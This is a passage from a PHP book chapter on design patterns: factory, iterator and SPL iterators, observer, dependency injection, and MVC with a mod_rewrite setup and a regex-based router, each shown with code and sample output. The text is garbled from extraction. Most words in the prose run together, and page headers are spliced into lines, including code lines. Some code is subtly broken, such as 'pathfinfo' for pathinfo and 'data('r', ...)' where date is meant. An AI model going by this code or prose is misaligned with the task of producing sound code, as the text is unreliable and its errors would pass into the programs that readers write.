objects, andletsyouunify thecomplexities thatmight occur insetting upanobject,
ormany types ofsimilar objects:
chapter_04/Factor y.php
/**
 * Log Factory
 *
 * Setup and return a file, mysql, or sqlite logger
 */
class Log_Factory {
  /**
   * Get a log object
   *
   * @param string $type The type of logging backend, file, ➥
       mysql or sqlite
   * @param array $options Log class options
   */
  public function getLog($type = 'file', array $options)
  {
    // Normalize the type to lowercase
    $type = strtolower($type);
    
    // Figure out the class name and include it
    $class = "Log_" .ucfirst($type);
    require_once str_replace('_', DIRECTORY_SEPARATOR, $class) . ➥
      '.php';
    137 Design P atterns
www.it-ebooks.info
    // Instantiate the class and set the appropriate options
    $log = new $class($options);
    switch ($type) {
      case 'file':
        $log->setPath($options['location']);
        break;
      case 'mysql':
        $log->setUser($options['username']);
        $log->setPassword($options['password']);
        $log->setDBName($options['location']);
        break;
      case 'sqlite':
        $log->setDBPath($options['location']);
        break;
    }
    
    return $log;
  }
}
Withaminor change—say ,adding anextra argument tothegetLog() method—you
caneasily addtheresulting object toyourRegistry ,andreap thebenefits ofnot
instantiating these objects over andover again.
Iterator
One ofthemost useful features ofPHP istheforeach construct. Withforeach ,we
caneasily iterate (loop over) array values andobject properties. Theiterator pattern
allows ustoaddthisforeach -able ability toanyobject’ sinternal data store, notjust
itspublic properties. Itoverrides thedefaultforeach behavior ,andallows usto
inject business logic into thatloop.
Itisnotuncommon tohave anobject thatrepresents both thebusiness logic—for
example, basic CRUD (create, read, update, anddelete, thefourfundamental database
interaction functions)—and storage ofadataset. Theiterator pattern allows youto
expose theinternal storage ofthatdata forsimple iteration. Itisactually implemented
ininternal classes built intoPHP—SimpleXMLElement ,DomNodeList ,PDOStatement ,
andothers. Theiterator class provided bySPL—the Standard PHP Library (see
Appendix B)—is theinternal iterator implementation, andcanbeused toimplement
theiterator pattern inyour own code. This means thatatthecore ofyour iterators,
youhave ablazingly fastC-based implementation. There aremany types ofiterat-PHP Master: W rite Cutting-edge Code 138
www.it-ebooks.info
ors—so many ,infact, thatanytalkataconference onSPL turns into adrinking
game around theword!
■Iterator —the basic iterator
■IteratorAggregate —an object thatcanprovide aniterator ,butisnotitself an
iterator
■RecursiveIteratorIterator —used toiterate overRecursiveIterator s
■FilterIterator —an iterator thatfilters thedata, only returning items thatmatch
thefilter
■RegexIterator —abuilt-in concrete implementation ofFilterIterator that
uses regular expressions asthefilter
■MultipleIterator —an iterator thatwilliterate over multiple iterators, oneafter
theother
■LimitIterator —afilter thatcanlimit itsiteration toasubset ofitsdata (similar
toLIMIT ,OFFSET ,andCOUNT inSQL; seeChapter 2)
Thelistgoes on…
We’llstart with theiterator itself. Theiterator isbest understood ifyouhave afirm
knowledge ofhow arrays areiterated inPHP.First, let’srefresh ourselves with an
actualforeach construct:
chapter_04/IteratorExplanation.php  (exception)
$array = array("Hello", "World");
foreach ($array as $key => $value) {
  echo '<pre>'. $key .': ' .$value . '</pre>'. PHP_EOL;
}
Theoutput from thissimple script is:
0: Hello
1: World139 Design P atterns
www.it-ebooks.info
Alltheactions thatPHP performs internally areavailable asfunctions, sowecan
actually write ourownforeach using ado/while loop:
chapter_04/IteratorExplanation.php  (exception)
$array = array("Hello", "World");
reset($array);
do {
  echo '<pre>'.key($array) .': '. current($array) .'</pre>'. ➥
    PHP_EOL;
} while (next($array));
Asyoucanseehere, first wecallthereset() method toreset theiteration. Then,
inside ourwhile condition, wecallnext() —this returns false ifwe’ve reached the
endofourarray ,otherwise itreturns true, andincrements theinternal pointer .Fi-
nally ,wecallkey() andcurrent() ,which return thekeyandvalue, respectively ,
forthecurrent position oftheinternal pointer .Theoutput from thisscript is
identical toourforeach construct.
Now let’slook attheiterator interface (note thattheinterface usesrewind() ,not
reset() ):
interface Iterator extends Traversable {
  public function current ();
  public function key();
  public function next();
  public function rewind();
  public function valid();
}
Theiterator introduces thevalid() method, which iscalled inconjunction with
next() .Thenext() method iscalled simply toadvance thepointer ,while the
valid() method isresponsible forreturning thetrue/false result thattheinternal
next() function returns.
Let’slook atourprevious example, using aniterator:PHP Master: W rite Cutting-edge Code 140
www.it-ebooks.info
chapter_04/Iterator .php (excerpt)
class BasicIterator implements Iterator {
    private $key = 0;
    private $data = array(
        "hello",
        "world",
    );  
    public function __construct() {
        $this->key = 0;
    }
    public function rewind() {
        $this->key = 0;
    }
    public function current() {
        return $this->data[$this->key];
    }
    public function key() {
        return $this->key;
    }
    public function next() {
        $this->key++;
        return true;
    }
    public function valid() {
        return isset($this->data[$this->key]);
    }
} 
Inthisiterator ,oursimple array isnow assigned totheBasicIterator->data
property .This property isprotected, andtherefore notaccessible directly—we must
usethemethods oftheclass toiterate andaccess thatdata:
chapter_04/Iterator .php (excerpt)
$iterator = new BasicIterator();
$iterator->rewind();141 Design P atterns
www.it-ebooks.info
do {
  $key = $iterator->key();
  $value = $iterator->current();
  echo '<pre>'. $key .': ' .$value . '</pre>'. PHP_EOL;
} while ($iterator->next() && $iterator->valid());
Asyoucansee,wesimply create ourBasicIterator instance, andthen callthe
rewind() ,next() ,valid() ,key() ,andcurrent() methods, instead oftheinternal
functions. Again, theoutput isidentical toourforeach construct.
Finally ,let’slook atusing ouriterator withforeach :
chapter_04/Iterator .php (excerpt)
$iterator = new BasicIterator();
foreach ($iterator as $key => $value) {
  echo '<pre>'. $key .': ' .$value . '</pre>'. PHP_EOL;
}
Once again, wereceive identical output. And while thisexample isfairly simplistic,
there isnothing tosaythatourdata must beasimple array—it could beadatabase
result that’sbeing fetched asit’siterated (this iswhatPDOStatement->fetch()
does), orresults foraweb service …anything.
One ofthebest concepts within theiterator design pattern istheOuterIterator ,
which isaproxy foranactual iterator .Totheoutside world, theOuterIterator is
itself theiterator ,but,infact, itsimply proxies thecalls toaninternal iterator .This
allows ittowrap extra functionality around theiteration without theknowledge of
theinternal iterator .
OuterIterator sareanideal example ofanother pattern—the proxy pattern. Ifyou
couple thiswith theArrayIterator class, youcanuseanyarray astheinternal
iterator ,andgenerate anobject with exactly thesame iteration behavior asanarray .
Another great aspect ofiterators isrecursion .Recursive iterators often seem totrip
people up,asmany developers donotunderstand thedifference between
RecursiveIterator andRecursiveIteratorIterator .2
2RecursiveIteratorIterator isoneofmanyOuterIterator s.PHP Master: W rite Cutting-edge Code 142
www.it-ebooks.info
Therelationship between these twoclasses issimple;RecursiveIterator isour
data structure—an iterator whose data contains other iterators. Thepurpose of
RecursiveIterator istoprovide astandard way ofchecking ifthere arechild
iterators foreach iteration. This isdone with thehasChildren() andgetChildren()
methods.
TheRecursiveIteratorIterator ,however ,isforactually iterating over thedata
structure; itcalls thehasChildren() and, ifnecessary ,getChildren() methods,
anditerates over thechildren also. This means youcanuseasimpleforeach for
iterating over nested structures (how many times have youhadtonest multiple
foreach constructs?).
Let’slook atasimple example using thebuilt-inRecursiveArrayIterator ,which
willcheck each element ofthearray toseeifitisalsoanarray ,andifso,recursively
iterate over it:
chapter_04/RecursiveIterator .php
$array = array(
  "Hello", // Level 1
  array(
    "World" // Level 2
  ),
  array(
    "How", // Level 2
    array(
      "are", // Level 3
      "you" // Level 3
    )
  ),
  "doing?" // Level 1
);
$recursiveIterator = new RecursiveArrayIterator($array);
$recursiveIteratorIterator = new RecursiveIteratorIterator ➥
  ($recursiveIterator);
foreach ($recursiveIteratorIterator as $key => $value) {
  echo '<pre>Depth: ' . $recursiveIteratorIterator->getDepth() . ➥
    '</pre>' . PHP_EOL;143 Design P atterns
www.it-ebooks.info
  echo '<pre>Key: ' . $key . '</pre>' . PHP_EOL;
  echo '<pre>Value: ' .$value . '</pre>' . PHP_EOL;
}
So,with only onelevel offoreach ,wecanrecurse over every level ofourthree-
level multi-dimensional array:
Depth: 0
Key: 0
Value: Hello
Depth: 1
Key: 0
Value: World
Depth: 1
Key: 0
Value: How
Depth: 2
Key: 0
Value: are
Depth: 2
Key: 1
Value: you
Depth: 0
Key: 3
Value: doing?
This makes recursion over treedata structures super -easy .
Moving ontosome more complicated iterators, thefirst onthelistis
FilterIterator .TheFilterIterator isanabstract class thatmust beextended,
anddoes exactly asyouwould expect: itfilters theiteration, skipping values that
fallshort ofmeeting thefilter criteria.FilterIterator works byadding asimple
accept() method thatmust return aBoolean indicating ifthecurrent iteration is
acceptable ornot.This iscalled inaddition tonext() andvalid() oneach iteration.
Iffalse isreturned, theiteration isskipped.
Here we’ll create afilter thatwill only accept theeven-keyed values:PHP Master: W rite Cutting-edge Code 144
www.it-ebooks.info
chapter_04/FilterIterator .php
class EvenFilterIterator extends FilterIterator {
  /**
   * Accept only even-keyed values
   * 
   * @return bool
   */
  public function accept()
  {
    // Get the actual iterator
    $iterator = $this->getInnerIterator();
    // Get the current key
    $key = $iterator->key();
    // Check for even keys    
    if ($key % 2 == 0) {
      return true;
    }
    return false;
  }
}
$array = array(
  0 => "Hello",
  1 => "Everybody Is",
  2 => "I'm",
  3 => "Amazing",
  4 => "The",
  5 => "Who",
  6 => "Doctor",
  7 => "Lives"
);
// Create an iterator from our array
$iterator = new ArrayIterator($array);
// Create our FilterIterator
$filterIterator = new EvenFilterIterator($iterator);
// Iterate145 Design P atterns
www.it-ebooks.info
foreach ($filterIterator as $key => $value) {
  echo '<pre>' . $key .': '. $value . '</pre>' . PHP_EOL;
}
Bear inmind thatwe’ve notchanged thefunctionality oftheArrayIterator —this
iskeytotheconcept ofusingFilterIterator .Italso means wecould create an
OddFilterIterator toaccept odd-keyed values, oraStepFilterIterator ,which
would accept anargument every “n”values.
Theoutput from ourprevious code isthis:
0: Hello
2: I'm
4: The
6: Doctor
Notice itonly outputs keys 0,2,4,and6.Youcanfilter thekeyorthevalue, and
youcansetupyouraccept() logic according toyour application needs.
Another similar iterator istheRegexIterator —itactually extendsFilterIterator ,
anditsaccept() method performs aregular expression against thecurrent value.
Ifthevalue matches theregular expression, itisaccepted. WecanuseRegexIterator
todosome cool stuff, such asusing itwithRecursiveDirectoryIterator tofind
allPHP files:
chapter_04/RegexIterator .php
// Create a RecursiveDirectoryIterator
$directoryIterator = new RecursiveDirectoryIterator("./");
// Create a RecursiveIteratorIterator to recursively iterate
$recursiveIterator = new RecursiveIteratorIterator ➥
  ($directoryIterator);
// Create a filter for PHP files
$regexFilter = new RegexIterator($recursiveIterator, '/(.*?)\. ➥
  (php|phtml|php3|php4|php5)$/');
// Iterate
foreach ($regexFilter as $key => $file) {PHP Master: W rite Cutting-edge Code 146
www.it-ebooks.info
  /* @var SplFileInfo $file */
  echo $file->getFilename() . PHP_EOL;
}
Theoutput from thisscript will listallthefiles with either a.php,.phtml ,.php3 ,
.php4 or.php5 fileextension inthecurrent working directory .
Another similar iterator istheLimitIterator .Aswementioned earlier ,thisworks
liketheLIMIT clause inSQL:
chapter_04/LimitIterator .php
// Define the array
$array = array(
    'Hello',
    'World',
    'How',
    'are',
    'you',
    'doing?'
);
// Create the iterator
$iterator = new ArrayIterator($array);
// Create the limiting iterator, to get the first 2 elements
$limitIterator = new LimitIterator($iterator, 0, 2);
// Iterate
foreach ($limitIterator as $key => $value) {
  echo '<pre>' . $key .': '. $value . '</pre>' . PHP_EOL;
}
This will output justthefirst twoelements inthearray:
0: Hello
1: World
Because oftheproxy nature oftheOuterIterator concept, wecanactually stack
them—and thisreally shows thepower ofiterators. Inthisexample, we’ll combine
ourRecursiveIteratorIterator andourLimitIterator :147 Design P atterns
www.it-ebooks.info
chapter_04/StackedOuterIterators.php
$array = array(
  "Hello", // Level 1
  array(
    "World" // Level 2
  ),
  array(
    "How", // Level 2
    array(
      "are", // Level 3
      "you" // Level 3
    )
  ),
  "doing?" // Level 1
);
// Create our Recursive data structure
$recursiveIterator = new RecursiveArrayIterator($array);
// Create our recursive iterator
$recursiveIteratorIterator = new RecursiveIteratorIterator ➥
  ($recursiveIterator);
// Create a limit iterator
$limitIterator = new LimitIterator($recursiveIteratorIterator, ➥
  2, 5);
// Iterate
foreach ($limitIterator as $key => $value) {
  $innerIterator = $limitIterator->getInnerIterator();
  echo '<pre>Depth: ' .$innerIterator->getDepth() . '</pre>' . ➥
    PHP_EOL;
  echo '<pre>Key: ' .$key . '</pre>' . PHP_EOL;
  echo '<pre>Value: ' .$value . '</pre>' . PHP_EOL;
}
Inthiscase, because theRecursiveIteratorIterator ineffect flattens themultidi-
mensional structure, thelimit isapplied totheflattened data. Ifthiswere afamily
treerepresented asanarray ,forinstance, wecould usetheLimitIterator todisplay
thegreat-grandparents onthemother’ sside ofthefamily .Inanycase, here’ sour
output:PHP Master: W rite Cutting-edge Code 148
www.it-ebooks.info
Depth: 1
Key: 0
Value: How
Depth: 2
Key: 0
Value: are
Depth: 2
Key: 1
Value: you
Depth: 0
Key: 3
Value: doing?
Theiterator pattern isoneofthemost versatile anduseful patterns inPHP.This
versatility isdueinparttotherolearrays play astheprimary data structure inPHP.
Withinternal support foriterators, they arefast, flexible, easy tounderstand, and
even easier touse.
Byusing theOuterIterator ,wecanreuse andexpand thebehavior ofourcode
with ease, inapure object oriented way.This is,frankly ,very cool!
Observer
Theobserver pattern isonethatmany JavaScript developers arefamiliar with. This
pattern isemployed inJavaScript bywhat you’d know asevents .
Thebasis oftheobserver pattern isthatitallows your application toregister callbacks
tobetriggered when specific events occur .InJavaScript, these consist ofactions
such asclicking (onclick ),page loading (onload ),orwhen themouse moves over
anitem (onmouseover ).Obviously ,inPHP,there isnomouse, sothese events don’t
apply—in fact, theevents youneed totarget aregoing tobespecific toyour applic-
ation’ sneeds.
Forexample, youmight want toaddanevent forthesaving ofdata. Witha“save
data” trigger ,youcanregister callbacks toclear your cache andupdate alog.Another
event could bedata deletion. Forthisyoumight register theclear cache andlog,
anduseanother callback todelete child data.
Theobserver isoneofthesimplest andmost flexible patterns. Wecanimplement
itusing aclass calledEvent ;thisclass hastwopublic methods:149 Design P atterns
www.it-ebooks.info
■registerCallback() :thismethod allows youtoattach anynumber ofcallbacks
toanevent with agiven name
■trigger() —this method will trigger theevent named above, andcallanycall-
backs registered forit
chapter_04/Event.php
/**
 * The Event Class
 * 
 * With this class you can register callbacks that will
 * be called (FIFO) for a given event.
 */
class Event {
  /**
   * @var array A multi-dimentional array of events => callbacks
   */
  static protected $callbacks = array();
  
  /**
   * Register a callback
   * 
   * @param string $eventName Name of the triggering event
   * @param mixed $callback An instance of Event_Callback or ➥
       a Closure
   */
  static public function registerCallback($eventName, $callback)
  {
    if (!is_callable($callback)) {
      throw new Exception("Invalid callback!");
    }
    
    $eventName = strtolower($eventName);
    
    self::$callbacks[$eventName][] = $callback;
  }
  
  /**
   * Trigger an event
   * 
   * @param string $eventName Name of the event to be triggered
   * @param mixed $data The data to be sent to the callback
   */
  static public function trigger($eventName, $data)PHP Master: W rite Cutting-edge Code 150
www.it-ebooks.info
  {
    $eventName = strtolower($eventName);
    
    if (isset(self::$callbacks[$eventName])) {
      foreach (self::$callbacks[$eventName] as $callback) {
        // The callback is either a closure, or an object ➥
             that defines __invoke()
        $callback($data);
      }
    }
  }
}
Thecallbacks arethen stored inthestatic protected Event::$callbacks property
asamulti-dimensional array keyed ontheevent name. This array looks like:
array(
  'eventname' => array(
                    'callback 1',
                    'callback 2',
                 ),
)
When anevent istriggered wesimply iterate ontheEvent::$callbacks sub-array
fortheevent, calling each callback inorder .Toutilize thispattern, firstwe’ll define
aclass thatrepresents partofourdata layer ,MyDataRecord .This class hasasave()
method that, when called, will trigger asave event:
chapter_04/MyDataRecord.php
class MyDataRecord {
  public function save()
  {
    // Actually save data here
    // Trigger the save event
    Event::trigger('save', array("Hello", "World"));
  }
}
Wepass inthename oftheevent (save )andsome data thatwill bepassed toa
callback. Next weregister ourtriggers. First we’re going tocreate acallback tolog151 Design P atterns
www.it-ebooks.info
theevent byimplementing the__invoke() magic method (this method iscalled
automatically when youtrytouseanobject asafunction). Once wehave created
thecallback, weregister itusingEvent::registerCallback() using thesame event
name,save .
chapter_04/LogCallback.php
/**
 * Logger callback
 */
class LogCallback {
  public function __invoke($data)
  {
    echo "Log Data" . PHP_EOL; 
    var_dump($data);
  }
}
// Register the log callback
Event::registerCallback('save', new LogCallback());
We’llalso register asecond callback, thistime toclear thecache. Forthiswe’ll use
aclosure ,also known asananonymous function:
// Register the clear cache callback as a closure
Event::registerCallback('save', function ($data) { 
                                  echo "Clear Cache" . PHP_EOL; 
                                  var_dump($data);
                                });
Now ,whenever wecalltheMyDataRecord->save() method, both ourcallbacks will
bebrought into action. These functions arecalled using theFIFO technique—First
In,First Out. This means thelogcallback will becalled first, followed bytheclear
cache callback:
// Instantiate a new data record
$data = new MyDataRecord();
$data->save(); // 'save' Event is triggered here
Calling thiscode will display:PHP Master: W rite Cutting-edge Code 152
www.it-ebooks.info
Log Data
array(2) {
  [0]=>
  string(5) "Hello"
  [1]=>
  string(5) "World"
}
Clear Cache
array(2) {
  [0]=>
  string(5) "Hello"
  [1]=>
  string(5) "World"
}
Going beyond asimple save, youmight want tohave apre-save andpost-save event;
perhaps youhave validation ofinput onpre-save, andalogofthesave itself inthe
post-save.
Dependency Injection
Thedependency injection pattern istheactofallowing theconsumer ofaclass to
inject dependencies. Typically ,these take theform ofobjects, closures, orcallbacks
thatfulfill requirements necessary fortheclass toperform itsintended actions.
Think ofdependency injection likesupplying thebatteries foryour WiiRemote.
Nintendo doesn’t care ifyouuseDuracell orEnergizer ,orwhether it’smade of
lithium, NiMH, NiCad, orplain oldalkaline; what itdoes care about isthatyou
meet thevital technical requirements: sizeAAand1.5V.
Dependency injection canbeused wherever youhave interdependencies inyour
code. Forexample, itmight beyour database connection, your HTTP client forweb
services, orwrappers around system binaries youneed tocallcross-platform. De-
pendency injection isoneofthesimplest patterns. Foreach dependency ,youspecify
asetter method (and it’snice ifyouaddagetter too!) thatwill accept anargument
that’sable tofulfill thedependency requirement.
Let’stake alook atrewriting ourlogfactory using dependency injection instead.
First, ourLogclass itself, with asetDataStore() method:153 Design P atterns
www.it-ebooks.info
chapter_04/DependencyInjection.php  (excerpt)
/**
 * Log Class
 */
class Log {
  /**
   * @var Log_Engine_Interface
   */
  protected $engine = false;
  /**
   * Add an event to the log
   * 
   * @param string $message 
   */
  public function add($message)
  {
    if (!$this->engine) {
      throw new Exception('Unable to write log. No Engine set.');
    }
    $data['datetime'] = time();
    $data['message'] = $message;
    $session = Registry::get('session');
    $data['user'] = $session->getUserId();
    $this->engine->add($data);
  }
  /**
   * Set the log data storage engine
   * 
   * @param Log_Engine_Interface $Engine 
   */
  public function setEngine(Log_Engine_Interface $engine)
  {
    $this->engine = $engine;
  }
  /**
   * Retrieve the data storage engine
   * 
   * @return Log_Engine_Interface PHP Master: W rite Cutting-edge Code 154
www.it-ebooks.info
   */
  public function getEngine()
  {
    return $this->engine;
  }
}
Now wecanuseournewLogclass, andpass inwhichever data storage engine we
wish touse. First, weneed aninterface toensure every driver meets ourrequire-
ments. This could alsobeanabstract class; bytype hinting ontheinterface orclass,
we’re ensuring thatourrequirements aremet—in thiscase, anadd() method, inten-
dedtoaddanevent tothelog:
chapter_04/DependencyInjection.php  (excerpt)
interface Log_Engine_Interface {
  /**
   * Add an event to the log
   * 
   * @param string $message 
   */
  public function add(array $data);
}
Now thatweknow what weneed toconform to,let’sdefine ourfirst engine. We’ll
start with thesimplest—file-based storage:
chapter_04/DependencyInjection.php  (excerpt)
class Log_Engine_File implements Log_Engine_Interface {
  /**
   * Add an event to the log
   * 
   * @param string $message 
   */
  public function add(array $data)
  {
    $line = '[' .data('r', $data['datetime']). '] ' . ➥
      $data['message']. ' User: ' .$data['user'] . PHP_EOL;
    
    $config = Registry::get('site-config');
    
    if (!file_put_contents($config['location'], $line, ➥155 Design P atterns
www.it-ebooks.info
          FILE_APPEND)) {
      throw new Exception("An error occurred writing to file.");
    }
  }
}
Withthatdone, inourapplication wecannow callourLogclass:
chapter_04/DependencyInjection.php  (excerpt)
$engine = new Log_Engine_File();
$log = new Log();
$log->setEngine($engine);
// Add it to the registry
Registry::add($log);
What’ sgreat about dependency injection isthatunlike thefactory pattern, ourLog
class requires noknowledge about each ofthedifferent storage engines. This means
thatanydeveloper utilizing ourlogclass canaddtheir own storage engines—so
long asthey conform totheinterface. Start simple, such aswith file-based storage
forourlogging class, andbuild upasrequirements change.
Model-View-Contr oller
Themodel-view-controller ,orMVC pattern, isaway ofdescribing therelationship
between three different layers ofanapplication. Thearchitecture consists of:
Model—data layer Allinput ultimately ends upbeing pushed tothe
model, andalloutput data comes from themodel.
This could beadatabase, web services, orfiles.
View—presentation layer This iswhere data istaken from themodel and
output totheuser.Pages andforms arealso gen-
erated here.
Controller—application flow
layerThecontroller iswhere it’sdetermined what the
user istrying todo,based ontheuser’ srequest.
Themodel isthen used toperform therequested
action andretrieve therequested data. Finally ,PHP Master: W rite Cutting-edge Code 156
www.it-ebooks.info
theview iscalled todisplay theresults oftheac-
tion totheuser.
TheMVC pattern isnotsomuch about implementing functionality; rather ,it’s
concerned with theway your application isstructured. Byseparating outthecom-
ponents ofMVC, youprovide aflexible framework foryour code. Theseparation
ofbusiness logic from display logic allows youtosend thesame data, whether it’s
anHTML table oraJSON response. This separation is,insome ways, similar tothe
separation thatfront-end developers apply between content andstyle with semantic
HTML andCSS.
Typically ,with MVC, you’ll have asingle controller foreach logical section ofyour
application. Infront ofthese controllers, you’ll have aRouter ;thisisthegatekeeper
thatdetermines what users arerequesting sothattheapplication canfulfill their
needs. Behind your controllers, youmay have aplethora ofmodels representing
different pieces ofyour data layer—for example, user accounts, profiles, shopping
carts …yougettheidea.
Once youhave interacted with themodel, beitsaving auser account orretrieving
their shopping cart, you’ll then pull inatemplate specific tothecorrect response
foryour user.That template could beanerror page ifthere wasaproblem, aform
toupdate theshopping cart, orasave confirmation page.
Anillustration ofatypical MVC architecture isshown inFigure 4.1.157 Design P atterns
www.it-ebooks.info
Figur e 4.1. The flowchart of a typical MVC application
The Contr oller
Atit’smost basic, thecontroller need benothing more than thereading ofaGET
argument todetermine thepage thatistobepassed, then output:
// Get the requested file (ignore any paths)
$page = basename($_GET['page']);
// Replace any extension
$ext = pathfinfo($page, PATHINFO_EXTENSION);
$page = str_replace('.' .$ext, '', $page);PHP Master: W rite Cutting-edge Code 158
www.it-ebooks.info
// Check if we need a model
if ($page == 'user-account') {
  // Include the model
  require_once 'user-model.php';
}
// Include the view
require_once $page . '-view.php';
Nobody wants URLs like/index.php?page=user -account&user_id=123&action=view ,
though. How doyouconvert thistothemore fancier /user -account/view/123 ?
Themost common solution isanApache module,mod_rewrite .This module allows
youtomatch URL patterns andtransform them. Thefollowing Apache configuration
will allow ustohandle ourpretty URL:
# Turn on mod_rewrite handling
RewriteEngine On
# Allows for three wildcards: page, action and id
RewriteRule (.*?)/(.*?)/(.*?)$ 
index.php?page=$1&action=$2&id=$3
Then weaddasimple index.php fortesting:
<?php var_dump($_GET); ?>
Now wecanload ourdesired /user -account/view/123 andwe’ll see:
array
  'page' => string 'user-account' (length=12)
  'action' => string 'view' (length=4)
  'id' => string '123' (length=3)
This allows ustohave adynamic setofURLs, butwhat ifwedon’t want topass in
anID?Orhave more than anIDtopass in?
Forexample, take /photos/dshafik/5584010786/in/set-72157626290864145/ ,aURL
forFlickr .Replacing thevalues, wemight endupwith variables likeso:
/photos/user/photoId/in/groupT ype-groupId/ .Wecould continue adding aRewriteR-
uleforevery possibility ,butthisbecomes tedious anddifficult tomaintain. Instead159 Design P atterns
www.it-ebooks.info
oftrying tohandle thiscomplexity inthelimited confines ofregular expressions
withinmod_rewrite ,wecansimply hand theentire URL toPHP towork itsmagic:
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule !\.(js|ico|gif|jpg|png|css)$ /index.php
Inthisconfiguration, we’ve introduced anewmod_rewrite option,RewriteCond .
This new option allows youtospecify conditions, which must also bemetbefore
theRewriteRule isapplied. Inthiscase, thecondition isthattherequested URL is
notarealfile.This isdone using theREQUEST_FILENAME server variable, andthe
condition !-f — .Inthissyntax, theexclamation point plays thesame roleasitdoes
inPHP,logical NOT ,while –fmeans “local file.”
Ifweagain hitourURL, wecanretrieve therequest string viathe
$_SERVER['REQUEST_URI'] global variable:
string '/user-account/view/123' (length=22)
Once wehave this, wecanparse itinwhichever way welike. Todothis, we’ll
create arouter .There areseveral common reasons forcreating arouter:
■toallow specifying exact regular expressions
■tosupport asyntax forspecifying key/value pairs
■tocreate afullparser with afinite structure
Tomake ourlives easier ,we’ll pursue themiddle option. Inthisrouter ,youcan
specify either:key ortype:key asplaceholders inourURL structure. Supported
types are:
■any
■integers
■alpha (includes dash andunderscore)
■alpha plus numeric
■regular expression (custom pattern)
Forexample, wecanuse/photos/:user/int:photoId/in/alpha:groupT ype/int:groupId
tosupport asimilar syntax toFlickr .PHP Master: W rite Cutting-edge Code 160
www.it-ebooks.info
First, wedefine each ofourregular expression subpattern matches. We’regoing to
usethese tobuild asimple regular expression thatmatches ourplaceholders:
const REGEX_ANY = "([^/]+?)";
const REGEX_INT = "([0-9]+?)";
const REGEX_ALPHA = "([a-zA-Z_-]+?)";
const REGEX_ALPHANUMERIC = "([0-9a-zA-Z_-]+?)";
const REGEX_STATIC = "%s";
Next weaddtwoproperties: onetohold ourcompiled routes, andanother tohold
abase URL. This base URL makes iteasy touseourrouter inasubfolder (that is,
/store/<our app> ):
/**
* @var array The compiled routes
*/
protected $routes = array();
/**
* @var string The base URL 
*/
protected $baseUrl = '';
Now wedefine afunction tospecify thebase URL, andquote itforourregular ex-
pression. Because URLs arefullofthedefault/delimiter ,we’re going touse@instead
when escaping. This makes creating ourregular expressions much simpler:
/**
* Set a base URL from which all routes will be matched
* 
* @param string $baseUrl 
*/
public function setBaseUrl($baseUrl)
{
  // Escape the base URL, with @ as our delimiter
  $this->baseUrl = preg_quote($baseUrl, '@');
}
Wenow getinto themeat oftherouter ,adding routes. TheRouter->addRoute()
allows ustospecify aroute pattern, aswell asasetofoptions thatwillbecombined
with theparsed key-value pairs. Such asspecifying acontroller:161 Design P atterns
www.it-ebooks.info
/**
* Add a new route
* 
* @param string $route The route pattern
*/
public function addRoute($route, $options = array())
{
  $this->routes[] = array('pattern' => $this->_parseRoute($route), ➥
    'options' => $options);
}
Theheavy lifting forthisisdone intheRouter->_parseRoute() method. Inthis
method, weuseanoften-overlooked feature ofPCRE (Perl Compatible Regular Ex-
pressions), which allows ustoname subpatterns. When usingpreg_match() ,the
matches will bereturned with both their normal indexed array keys, aswell asa
named keyusing thesubpattern name. This issimilar tofunctions such as
mysql_fetch_array() .It’sachieved byplacing?P,followed bythename inside of
greater than/less than signs?P<NAME> atthestart ofthesubpattern:
/**
* Parse the route pattern
* 
* @param string $route The pattern
* @return string 
*/
     protected function _parseRoute($route)
     {
          $baseUrl = $this->baseUrl;
          // Short-cut for the / route
          if ($route == '/') {
               return "@^$baseUrl/$@";
          }
          // Explode on the / to get each part
          $parts = explode("/", $route);
          // Start our regex, we use @ instead of / to avoid ➥
               issues with the URL path
          // Start with our base URL
          $regex = "@^$baseUrl";
          // Check to see if it starts with a / and discard the ➥
               empty argPHP Master: W rite Cutting-edge Code 162
www.it-ebooks.info
          if ($route[0] == "/") {
               array_shift($parts);
          }
          // Foreach each part of the URL
          foreach ($parts as $part) {
               // Add a / to the regex
               $regex .= "/";
               // Start looking for type:name strings
               $args = explode(":", $part);
               if (sizeof($args) == 1) {
                    // If there's only one value, it's a static ➥
                         string
                    $regex .= sprintf(self::REGEX_STATIC, ➥
                      preg_quote(array_shift($args), '@'));
                    continue;
               } elseif ($args[0] == '') {
                    // If the first value is empty, there is no ➥
                         type specified, discard it
                    array_shift($args);
                    $type = false;
               } else {
                    // We have a type, pull it out
                    $type = array_shift($args);
               }
               // Retrieve the key
               $key = array_shift($args);
               // If it's a regex, just add it to the expression ➥
                    and move on
               if ($type == "regex") {
                    $regex .= $key;
                    continue;
               }
               // Remove any characters that are not allowed in ➥
                    sub-pattern names
               $this->normalize($key);
               // Start creating our named sub-pattern
               $regex .= '(?P<' . $key . '>';163 Design P atterns
www.it-ebooks.info
               // Add the actual pattern
               switch (strtolower($type)) {
                    case "int":
                    case "integer":
                         $regex .= self::REGEX_INT;
                         break;
                    case "alpha":
                         $regex .= self::REGEX_ALPHA;
                         break;
                    case "alphanumeric":
                    case "alphanum":
                    case "alnum":
                         $regex .= self::REGEX_ALPHANUMERIC;
                         break;
                    default:
                         $regex .= self::REGEX_ANY;
                         break;
               }
               // Close the named sub-pattern
               $regex .= ")";
          }
          // Make sure to match to the end of the URL and make it ➥
               unicode aware
          $regex .= '$@u';
          return $regex;
     }
Finally ,wedefine amethod totake ourURL path, andparse itdown toourroute’ s
key-value pairs. Once wehave this, wecandispatch ourcontrollers, andactually
perform atask forourusers. You’ll notice thatweunset allthenumeric indices,
asthey’re unnecessary—unfortunately ,PHP doesn’t provide away toignore them:
/**
 * Retrieve the route data
 * 
 * @param string $request The request URI
 * @return array 
 */
public function getRoute($request)
{
     $matches = array();PHP Master: W rite Cutting-edge Code 164
www.it-ebooks.info
     foreach ($this->routes as $route) {
          // Try to match the request against defined routes
          if (preg_match($route['pattern'], $request, ➥
                $matches)) {
               // If it matches, remove unnecessary numeric ➥
                   indexes
               foreach ($matches as $key => $value) {
                   if (is_int($key)) {
                        unset($matches[$key]);
                    }
               }
               // Merge the matches with the supplied options
               $result = $matches + $route['options'];
               return $result;
          }
     }
     return false;
}
Thelastpartofourclass isautility method forcleaning upkeynames fortheregular
expression:
     /**
      * Normalize a string for sub-pattern naming
      * 
      * @param string &$param 
      */
     public function normalize(&$param)
     {
          $param = preg_replace("/[^a-zA-Z0-9]/", "", $param);
     }
}
Ifwenow take ourRouter class andrunit,we’ll seethis:
$router = new RouterRegex;
$router->addRoute("/alpha:page/alpha:action/:id", 
array('controller' => 'default'));165 Design P atterns
www.it-ebooks.info
var_dump($router);
